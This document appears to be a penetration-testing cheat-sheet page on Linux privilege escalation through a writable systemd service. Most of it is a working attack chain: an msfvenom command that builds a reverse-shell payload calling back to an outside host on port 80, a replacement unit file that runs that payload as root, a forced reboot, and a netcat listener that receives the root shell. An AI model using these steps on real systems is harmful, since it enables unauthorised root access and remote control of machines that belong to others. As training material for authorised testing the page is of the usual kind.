---
description: Root access with writable services.
---

# Writable services

(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

OR

have enough privilege to restart the service or host

The most important parameters here are :

* User : The user that the service will run as.
* Execstart : It specifies the command that will run when the service starts.

Now we want to get shell as root. There are many ways to do so with systemd services.

```
$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/test/restjson_test
ExecStart=flask run -h 0.0.0.0 -p 30000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f elf -o reverse.elf
```

```
echo "
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/test/restjson_test
ExecStart=/tmp/reverse.elf
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
" > pythonapp.service
```

```
sudo reboot --reboot -f

$ nc -nvlp 80
```
